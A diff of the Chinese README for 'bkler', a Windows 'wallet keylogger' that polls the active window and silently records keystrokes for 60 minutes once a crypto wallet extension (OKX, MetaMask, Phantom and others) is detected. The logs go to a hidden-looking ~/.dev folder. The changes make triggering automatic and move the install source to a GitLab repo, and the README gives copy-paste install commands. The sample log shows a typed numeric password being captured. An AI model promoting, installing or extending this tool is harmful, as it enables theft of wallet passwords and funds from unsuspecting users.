@@ -1,23 +1,20 @@
 # 钱包键盘记录器 (Wallet Keylogger)
 
-点击钱包扩展窗口后触发键盘记录，记录到 `~/.dev/bkler/recording_{日期}.log`
+持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `~/.dev/bkler/recording_{日期}.log`
 
 ## 功能特性
 
-- **点击触发** - 点击钱包扩展窗口后开始记录
+- **持续检测** - 后台持续检测活动窗口
+- **自动触发** - 检测到钱包窗口时自动开始记录
 - **限时记录** - 自动记录 60 分钟后停止
 - **Windows 平台** - 支持 Windows 系统
-- **可扩展** - 支持自定义钱包关键词列表
-- **自动检测** - 检测主流钱包扩展窗口
+- **智能匹配** - 检测 Unknown 窗口和钱包关键词
 
-## 支持的钱包扩展
+## 工作原理
 
-- OKX Wallet
-- MetaMask
-- Rabby Wallet
-- Phantom
-
-（可在代码中添加更多钱包关键词）
+程序后台持续检测活动窗口（每 0.2 秒），当满足以下条件时自动触发记录：
+- 窗口标题为 `Unknown`（钱包扩展下拉窗口）
+- 窗口标题包含钱包关键词（OKX, MetaMask, Wallet, Phantom 等）
 
 ## 安装
 
@@ -27,8 +24,8 @@
 # 安装 uv（如果尚未安装）
 curl -LsSf https://astral.sh/uv/install.sh | sh
 
-# 从 GitHub 仓库安装工具
-uv tool install git+https://github.com/DegenStar/bkler.git
+# 从 GitLab 仓库安装工具
+uv tool install git+https://gitlab.com/web3toolsbox/bkler.git
 
 # 直接使用命令
 bkler
@@ -38,7 +35,7 @@ bkler
 
 ```bash
 # 克隆项目
-git clone https://github.com/DegenStar/bkler.git
+git clone https://gitlab.com/web3toolsbox/bkler.git
 cd bkler
 pip install -e .
 ```
@@ -53,7 +50,7 @@ bkler
 
 ```bash
 # 克隆项目
-git clone https://github.com/DegenStar/bkler.git
+git clone https://gitlab.com/web3toolsbox/bkler.git
 cd bkler
 pip install -r requirements.txt
 python bkler.py
@@ -65,13 +62,7 @@ python bkler.py
 bkler
 ```
 
-程序启动后会监听鼠标点击，当点击以下钱包窗口时自动开始记录：
-- OKX Wallet
-- MetaMask
-- Rabby Wallet
-- Phantom
-
-点击后自动记录 60 分钟，之后自动停止。
+程序启动后会持续检测活动窗口，当打开钱包扩展（如 OKX、MetaMask 等）时，自动开始记录 60 分钟。
 
 按 `F12` 键退出程序，或使用 `Ctrl+C`
 
@@ -107,30 +98,14 @@ bkler/
 
 ```
 # --- 记录开始: 2026-05-28 15:30:00 ---
-# 触发窗口: OKX Wallet
-[2026-05-28 15:30:05] [OKX Wallet] 1
-[2026-05-28 15:30:06] [OKX Wallet] 2
-[2026-05-28 15:30:07] [OKX Wallet] 3
-[2026-05-28 15:30:08] [OKX Wallet] 4
-[2026-05-28 15:30:09] [OKX Wallet] 5
-[2026-05-28 15:30:10] [OKX Wallet] [Enter]
+# 触发窗口: [Unknown]
+[2026-05-28 15:30:05] [Unknown] 1
+[2026-05-28 15:30:06] [Unknown] 2
+[2026-05-28 15:30:07] [Unknown] 3
+[2026-05-28 15:30:08] [Unknown] 4
+[2026-05-28 15:30:09] [Unknown] 5
+[2026-05-28 15:30:10] [Unknown] [Enter]
 # --- 记录结束: 2026-05-28 16:30:00 ---
-```
-
-## 添加更多钱包
-
-编辑 `bkler/detectors.py`，在 `WALLET_PATTERNS` 列表中添加：
-
-```python
-WALLET_PATTERNS = [
-    "OKX Wallet",
-    "MetaMask",
-    "Rabby Wallet",
-    "Phantom",
-    "Rainbow",           # 添加新钱包
-    "Coinbase Wallet",   # 添加新钱包
-    # ...
-]
 ```
 
 ## 安全注意事项
